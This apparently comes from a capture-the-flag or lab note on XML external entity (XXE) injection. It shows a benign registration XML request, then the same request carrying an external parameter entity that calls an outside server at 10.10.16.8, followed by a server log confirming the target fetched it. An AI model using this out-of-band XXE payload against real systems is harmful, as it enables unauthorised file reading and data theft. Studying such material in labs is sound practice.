# XXE

<?xml version="1.0" encoding="UTF-8"?>
<root>
  <method>POST</method>
  <uri>/auth/register</uri>
  <user>
    <username>username_value</username>
    <password>password_value</password>
  </user>
</root>

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE test [ 
<!ENTITY % xxe SYSTEM "http://10.10.16.8"> 
%xxe;
]>

<root>
  <method>POST</method>
  <uri>/auth/register</uri>
  <user>
    <username>username_value</username>
    <password>password_value</password>
  </user>
</root>

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.192 - - [12/May/2023 12:35:19] "GET / HTTP/1.1" 200 -